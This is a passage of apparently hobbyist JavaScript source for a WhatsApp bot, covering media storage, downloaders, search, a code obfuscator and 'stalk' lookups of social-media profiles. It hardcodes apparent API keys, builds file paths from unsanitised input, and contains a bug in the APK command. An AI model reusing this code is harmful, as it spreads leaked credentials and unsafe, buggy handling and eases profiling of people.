fs.writeFileSync('./File/database/Lorenzosticker.json', JSON.stringify(StickerLorenzo))
fs.unlinkSync(delb)
newReply(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!isCreator) return ownernya()
if (args.length < 1) return newReply('Enter the sticker name')
if (!StickerLorenzo.includes(q)) return newReply("The name does not exist in the database")
let wanu = StickerLorenzo.indexOf(q)
StickerLorenzo.splice(wanu, 1)
fs.writeFileSync('./File/database/Lorenzosticker.json', JSON.stringify(StickerLorenzo))
fs.unlinkSync(`./File/sticker/${q}.webp`)
newReply(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of StickerLorenzo) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerLorenzo.length}*`
newReply(teks)
}
break
case 'addmsg': {
	if (!isCreator) return ownernya()
                if (!m.quoted) return newReply('Reply Message You Want To Save In Database')
                if (!text) return newReply(`Example : ${prefix + command} filename`)
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) return newReply(`'${text}' registered in the message list`)
                msgs[text.toLowerCase()] = quoted.fakeObj
newReply(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) return newReply(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) return newReply(`'${text}' not listed in the message list`)
                ToxxicTechInc.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        newReply(teks)
	    }
	    break 
	case 'delmsg': case 'deletemsg': {
		if (!isCreator) return ownernya()
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return newReply(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		newReply(`Successfully deleted '${text}' from the message list`)
            }
	    break
case 'addvn':{
if (!isCreator) return ownernya()
if (args.length < 1) return newReply('Whats the audio name?')
if (VoiceNoteLorenzo.includes(q)) return newReply("The name is already in use")
let delb = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted)
VoiceNoteLorenzo.push(q)
await fsx.copy(delb, `./File/audio/${q}.mp3`)
fs.writeFileSync('./File/database/Lorenzovn.json', JSON.stringify(VoiceNoteLorenzo))
fs.unlinkSync(delb)
newReply(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!isCreator) return ownernya()
if (args.length < 1) return newReply('Enter the vn name')
if (!VoiceNoteLorenzo.includes(q)) return newReply("The name does not exist in the database")
let wanu = VoiceNoteLorenzo.indexOf(q)
VoiceNoteLorenzo.splice(wanu, 1)
fs.writeFileSync('./File/database/Lorenzovn.json', JSON.stringify(VoiceNoteLorenzo))
fs.unlinkSync(`./File/audio/${q}.mp3`)
newReply(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNoteLorenzo) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteLorenzo.length}*`
newReply(teks)
}
break
case 'addzip':{
if (!isCreator) return ownernya()

if (args.length < 1) return newReply(`What's the zip name?`)
let teks = `${text}`
{
if (ZipLorenzo.includes(teks)) return newReply("This name is already in use")
let delb = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted)
ZipLorenzo.push(teks)
await fsx.copy(delb, `./File/zip/${teks}.zip`)
fs.writeFileSync('./File/database/zip.json', JSON.stringify(ZipLorenzo))
fs.unlinkSync(delb)
newReply(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!isCreator) return ownernya()

if (args.length < 1) return newReply('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipLorenzo.includes(teks)) return newReply("This name does not exist in the database")
let wanu = ZipLorenzo.indexOf(teks)
ZipLorenzo.splice(wanu, 1)
fs.writeFileSync('./File/database/zip.json', JSON.stringify(ZipLorenzo))
fs.unlinkSync(`./File/zip/${teks}.zip`)
newReply(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {

let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipLorenzo) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipLorenzo.length}*`
newReply(teksooooo)
}
break
case 'addapk':{
if (!isCreator) return ownernya()

if (args.length < 1) return newReply('What is the name of the apk?')
let teks = `${text}`
{
if (ApkLorenzo.includes(teks)) return newReply("This name is already in use")
let delb = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./File/apk/${teks}.apk`)
fs.writeFileSync('./File/database/apk.json', JSON.stringify(ApkLorenzo))
fs.unlinkSync(delb)
newReply(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!isCreator) return ownernya()

if (args.length < 1) return newReply('Name of the apk?')
let teks = `${text}`
{
if (!ApkLorenzo.includes(teks)) return newReply("This name does not exist in the database")
let wanu = ApkLorenzo.indexOf(teks)
ApkLorenzo.splice(wanu, 1)
fs.writeFileSync('./File/database/apk.json', JSON.stringify(ApkLorenzo))
fs.unlinkSync(`./File/apk/${teks}.apk`)
newReply(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {

let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkLorenzo) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkLorenzo.length}`
newReply(teksoooooo)
}
break
case 'addpdf':{
if (!isCreator) return ownernya()

if (args.length < 1) return newReply('What is the name of the pdf')
let teks = `${text}`
{
if (DocLorenzo.includes(teks)) return newReply("This name is already in use")
let delb = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted)
DocLorenzo.push(teks)
await fsx.copy(delb, `./File/doc/${teks}.pdf`)
fs.writeFileSync('./File/database/doc.json', JSON.stringify(DocLorenzo))
fs.unlinkSync(delb)
newReply(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!isCreator) return ownernya()

if (args.length < 1) return newReply('Enter the name')
let teks = `${text}`
{
if (!DocLorenzo.includes(teks)) return newReply("This name does not exist in the database")
let wanu = DocLorenzo.indexOf(teks)
DocLorenzo.splice(wanu, 1)
fs.writeFileSync('./File/database/doc.json', JSON.stringify(DocLorenzo))
fs.unlinkSync(`./File/doc/${teks}.pdf`)
newReply(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {

let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of DocLorenzo) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${DocLorenzo.length}*`
newReply(teksoooo)
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
ToxxicTechInc_dev = await getBuffer(`https://github.com/DGLorenzo/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await ToxxicTechInc.sendMessage(m.chat, { audio: ToxxicTechInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'friend':
case 'searchfriend':{
await hana()
let teman = pickRandom(Toxxicverifieduser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
newReply('𝐑𝐢𝐚𝐬 𝐌𝐚𝐧𝐚𝐠𝐞𝐝 𝐓𝐨 𝐅𝐢𝐧𝐝 𝐎𝐧𝐞 𝐅𝐫𝐢𝐞𝐧𝐝')
}, 5000)
setTimeout(() => {
ToxxicTechInc.sendMessage(from, {text: `𝐌𝐞𝐞𝐭 @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case 'q': case 'quoted': {
if (!m.quoted) return newReply('Reply the Message!!')
let Lorenzoquotx= await ToxxicTechInc.serializeM(await m.getQuotedObj())
if (!Lorenzoquotx.quoted) return newReply('The message you are replying to is not sent by the bot')
await Lorenzoquotx.quoted.copyNForward(m.chat, true)
}
break
case 'obfus': case 'obfuscate': case 'enc':{
if (!q) return newReply(`Example ${prefix+command} const ToxxicTechInc = require('baileys')`)
let meg = await obfus(q)
newReply(`JavaScript Encrypted Using Rias Ai
${meg.result}`)
}
break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return newReply('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                newReply(teks)
	    }
	    break
case 'yts2': case 'ytsearch2': {
                if (!text) return newReply(`Example : ${prefix + command} story wa anime`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
                }
                ToxxicTechInc.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
            
            case 'yts': case 'ytsearch': {
  if (!text) return newReply(`Example : ${prefix + command} title`);
  try {
let yts = require("yt-search")
    let search = await yts(text);
    let videos = search.all;
    console.log(videos)
    if (!videos || videos.length === 0) {
      newReply('No video found');
      return;
    }
    // Choose between 1 and 5 videos at random
    const numVideos = Math.min(videos.length, Math.floor(Math.random() * 10) + 1);
    const selectedVideos = [];
    while (selectedVideos.length < numVideos) {
      const randomIndex = Math.floor(Math.random() * videos.length);
      const randomVideo = videos.splice(randomIndex, 1)[0]; // Avoid selecting the same videos
      selectedVideos.push(randomVideo);
    }
    let push = [];
    for (let i = 0; i < selectedVideos.length; i++) {
      let video = selectedVideos[i];
      let cap = `Title : ${video.title}`;
      const mediaMessage = await prepareWAMessageMedia({ image: { url: video.thumbnail } }, { upload: ToxxicTechInc.waUploadToServer });
      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: cap
        }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          title: `Video ${i + 1}`,
          subtitle: '',
          hasMediaAttachment: true,
          ...mediaMessage
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [
            {
              "name": "cta_copy",
              "buttonParamsJson": `{"display_text":"Copy Url","id":"1234","copy_code":"${video.url}"}`
            }
          ]
        })
      });
    }
    const msg = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: ownername
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: botname
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: push
            }),
            contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
          })
        }
      }
    }, {quoted:m});
    await ToxxicTechInc.relayMessage(m.chat, msg.message, {
      messageId: msg.key.id
    });
  } catch (e) {
    console.error(e);
    await newReply(`Error`);
  }
}
break
     			case "play": {
     			await ToxxicTechInc.sendMessage(m.chat, { react: { text: `🎵`, key: m.key }})
  if (!text) return newReply("Example : ${prefix} believer");

async function handleCommandytplay(text) {
    let res;
    try {
        res = await yts(text);
    } catch (error) {
        throw new Error('Error fetching YouTube search results');
    }

    let vid = res.videos[0];
    if (!vid) throw new Error('Video not found, try reversing the title and author');

    let { title, description, thumbnail, videoId } = vid;
    const url = 'https://www.youtube.com/watch?v=' + videoId;

    let yt;
    try {
        yt = await youtubedl(url);
    } catch (error) {
        yt = await youtubedlv2(url);
    }

    const link = await yt.audio['128kbps'].download();

    let doc = {
        audio: {
            url: link
        },
        mimetype: 'audio/mpeg',
        ptt: true, 
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                mediaType: 2,
                mediaUrl: url,
                title: title,
                body: xtime,
                sourceUrl: url,
                thumbnail: await (await fetch(thumbnail)).buffer() 
            }
        }
    };

    return ToxxicTechInc.sendMessage(m.chat, doc, { quoted: m });
}


    try {
        await handleCommandytplay(text);
    } catch (error) {
        console.error(error);
    }
}
break;

case 'dev': case 'toxxic': {
await ToxxicTechInc.sendMessage(m.chat, { react: { text: `👑️`, key: m.key }})
newReply(`═════════════════════╼
│    *「 𝐌𝐲 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧🎗️」*
│ *ᴺᵃᵐᵉ*   : *𝐓𝐨𝐱𝐱𝐢𝐜 𝐁𝐨𝐲* 
│ *ᴬᵍᵉ*     : *𝐈𝐦 𝟏𝟔 𝐲𝐞𝐚𝐫𝐬* 
│ *ᴴᵒᵇᵇʸ*   : *𝐌𝐚𝐤𝐢𝐧𝐠 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐁𝐨𝐭* 
│ *ᴿᵒˡᵉ*       : *𝐆𝐎𝐉𝐎 𝐒𝐀𝐓𝐎𝐑𝐔* 
│ *ᵂᵒʳᵈˢ*   : *𝐘𝐨𝐰𝐚𝐢 𝐌𝐨* 
│ *ˢᵗᵃᵗᵘˢ*    : *𝐀𝐥𝐢𝐯𝐞* 
│  𝐓𝐡𝐢𝐬 𝐰𝐚𝐬 𝐦𝐚𝐝𝐞 𝐁𝐲 𝐑𝐢𝐚𝐬 𝐀𝐢
╰━━━━━━━━━━━━━━━━━━━━━━━━━╼`)
}
break
case 'ytmp3': case 'ytaudio':
let Lorenzoaudp3 = require('./lib/ytdl')
if (args.length < 1 || !isUrl(text) || !Lorenzoaudp3.isYTUrl(text)) return newReply(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
let audio = await Lorenzoaudp3.mp3(text)
await ToxxicTechInc.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
case 'ytmp4': case 'ytvideo': {
const Lorenzovidoh = require('./lib/ytdl')
if (args.length < 1 || !isUrl(text) || !Lorenzovidoh.isYTUrl(text)) newReply(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await Lorenzovidoh.mp4(text)
const ytc=`
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
await ToxxicTechInc.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'git': case 'gitclone':
if (!args[0]) return newReply(`Where is the link?\nExample :\n${prefix}${command} https://github.com/Toxic1239`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return newReply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    ToxxicTechInc.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => newReply(mess.error))
break
case'tiktok':{
if (!text) return newReply(`Use it by the way: ${prefix+command} *query*\n\n_Example_\n\n${prefix+command} khaby lame`)
ToxxicTechInc.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://api.junn4.my.id/search/tiktoksearch?query=${text}`)
const capt = anu.result.title
await ToxxicTechInc.sendMessage(m.chat, { video: { url: anu.result.no_watermark}, caption: `🔖TITLE : ${capt}`}, {quoted: m})
await ToxxicTechInc.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}catch (error) {
newReply(`Sorry this video can't be download\n\nRequest failed with status code *400*`);
}
}
break
case 'tiktokvideo':
case 'tiktokmp4': {
if (!q) return newReply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return newReply(`Link Invalid!!`)
require('./lib/tiktok').Tiktok(q).then( data => {
ToxxicTechInc.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'tiktokmp3':
case 'tiktokaudio':{
if (!q) return newReply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return newReply(`Link Invalid!!`)
require('./lib/tiktok').Tiktok(q).then( data => {
const Lorenzotikmp3 = {url:data.audio}
ToxxicTechInc.sendMessage(m.chat, { audio: Lorenzotikmp3, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
})
}
break
case'ttslide': case 'tiktokslide':{
if (!text) return newReply(`Use it by the way ${prefix+command} *url*\n\n_Example_\n\n${prefix+command} https://vt.tiktok.com/ZSL36LfEP/`)
ToxxicTechInc.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://aemt.me/download/tiktokslide?url=${text}`)
await ToxxicTechInc.sendMessage(m.chat, { image: { url: anu.result.data.origin_cover}, caption: ``}, {quoted: m})
await ToxxicTechInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await ToxxicTechInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
case 'google': {
if (!q) return newReply(`Example : ${prefix + command} ${botname}`)
await hana()
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
newReply(teks)
})
}
break
case 'weather':{
if (!text) return newReply('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           ToxxicTechInc.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
           case 'facebook2': case 'fb2':{
if (!text) return newReply(`Enter the link!!!`)
if (!isUrl(args[0])) return newReply(`Where is the link?`)
await ToxxicTechInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
try{
let anu = await fetchJson(`https://aemt.me/download/fbdown?url=${text}`)
ToxxicTechInc.sendMessage(m.chat, { video: { url: anu.result.url.urls[0].hd }, caption: 'Here you go!' }, { quoted: m })
await ToxxicTechInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await ToxxicTechInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
           case 'fb':
           case 'facebook':
case 'facebookvid': {
           if (!args[0]) {
    return newReply(`Please send the link of a Facebook video\n\nEXAMPLE :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`)
  }
  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return newReply('Url invalid')
  }
  try {
    const result = await fg.fbdl(args[0]);
    const tex = `
        [ FACEBOOK DL ]
${themeemoji} Title: ${result.title}`;
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    ToxxicTechInc.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    newReply('Maybe private video!')
  }
  }
  break
case 'tiktokstalk': {
	  if (!text) return newReply(`Username? `)
  let res = await fg.ttStalk(args[0])
  let txt = `
┌──「 *TIKTOK STALK* 
──「 *TIKTOK STALK* 
▢ *🔖Number:* ${res.name}
▢ *🔖Username:* ${res.username}
▢ *👥followers:* ${res.followers}
▢ *🫂following:* ${res.following}
▢ *📌Desc:* ${res.desc}

▢ *🔗 Link* : https://tiktok.com/${res.username}
└────────────`
  await ToxxicTechInc.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m})
}
break
case 'xxxigstalk': {
if (!text) return newReply(`Enter Instagram Username\n\nExample: ${prefix + command} toxxicedits`)
    let res = await fg.igStalk(text)
    let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${res.name} 
▢ *🔖Username:* ${res.username}
▢ *👥Follower:* ${res.followersH}
▢ *🫂Following:* ${res.followingH}
▢ *📌Bio:* ${res.description}
▢ *🏝️Posts:* ${res.postsH}
▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────`
     await ToxxicTechInc.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
}
break
case 'ghstalk': case 'githubstalk':{
if (!q) return newReply(`Example ${prefix+command} Queen Rias`)
await hana()
let githubstalk = require('./lib/scraper')
aj = await githubstalk.githubstalk(`${q}`)
ToxxicTechInc.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case 'npmstalk':{
if (!q) return newReply(`Example ${prefix+command} Lorenzoapi`)
await hana()
let npmstalk = require('./lib/scraper')
eha = await npmstalk.npmstalk(q)
newReply(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'ffstalk':{
if (!q) return newReply(`Example ${prefix+command} 946716486`)
await hana()
let ffstalk = require('./lib/scraper')
eeh = await ffstalk.ffstalk(`${q}`)
newReply(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case 'mlstalk': {
if (!q) return newReply(`Example ${prefix+command} 530793138|8129`)
await hana()
let mlstalk = require('./lib/scraper')
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
newReply(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
case 'spotify':{
	if (!text) return newReply(`*Please enter a song name*`)
    try {
        const apiUrl = `https://www.guruapi.tech/api/spotifyinfo?text=${encodeURIComponent(text)}`
        const response = await fetch(apiUrl);
        if (!response.ok) {
            console.log('Error searching for song:', response.statusText)
            return newReply('Error searching for song')
        }
        const data = await response.json()
        const coverimage = data.spty.results.thumbnail
        const name = data.spty.results.title
        const slink = data.spty.results.url
        const dlapi = `https://www.guruapi.tech/api/spotifydl?text=${encodeURIComponent(text)}`
        const audioResponse = await fetch(dlapi)
        if (!audioResponse.ok) {
            console.log('Error fetching audio:', audioResponse.statusText)
            return newReply('Error fetching audio')
        }
        const audioBuffer = await audioResponse.buffer()
        const tempDir = os.tmpdir()
        const audioFilePath = path.join(tempDir, 'audio.mp3')
        try {
            await fs.promises.writeFile(audioFilePath, audioBuffer)
        } catch (writeError) {
            console.error('Error writing audio file:', writeError)
            return newReply( 'Error writing audio file')
        }
        let doc = {
            audio: {
              url: audioFilePath
            },
            mimetype: 'audio/mpeg',
            ptt: true,
            waveform:  [100, 0, 100, 0, 100, 0, 100],
            fileName: "Queen Rias",
            contextInfo: {
              mentionedJid: [m.sender],
              externalAdReply: {
                title: `PLAYING TO ${name}`,
                body: botname,
                thumbnailUrl: coverimage,
                sourceUrl: websitex,
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
        }        
        await ToxxicTechInc.sendMessage(m.chat, doc, { quoted: m })
    } catch (error) {
        console.error('Error fetching Spotify data:', error)
        return newReply('*Error*')
    }
    }
    break
case 'imdb':
if (!text) return newReply(`_Name a Series or movie`)
await hana()
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
